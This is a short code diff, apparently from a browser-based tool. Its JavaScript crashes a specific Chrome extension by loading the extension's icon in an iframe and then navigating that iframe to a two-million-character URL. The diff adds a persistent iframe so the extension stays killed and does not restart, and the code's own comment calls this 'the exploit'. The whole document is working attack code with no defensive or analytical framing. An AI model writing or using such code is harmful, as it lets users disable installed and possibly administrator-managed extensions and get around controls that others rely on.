@@ -135,19 +135,17 @@
     	    let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
     	    let extFrame = document.createElement("iframe");
     	    extFrame.src = extURL;
-    	    extFrame.style.display = "none";
     	    document.body.appendChild(extFrame);
     
     	    setTimeout(function() {
         	let killURL = "https://" + "e".repeat(2000000);
-        	extFrame.src = killURL;
-        	let iframe = document.createElement("iframe");
-        	iframe.src = extURL;
-        	document.body.appendChild(iframe);
-        
+        	extFrame.src = killURL;    
                 setTimeout(function() {
             	    document.body.removeChild(extFrame);
             	    document.body.removeChild(overlay);
+		    let persistFrame = document.createElement("iframe"); // Makes a new iframe so the exploit kills the extension instead of restarting it
+        	    persistFrame.src = extURL;
+        	    document.body.appendChild(persistFrame);
             	    createPopup();
         	}, 1000);
     	    }, 250);
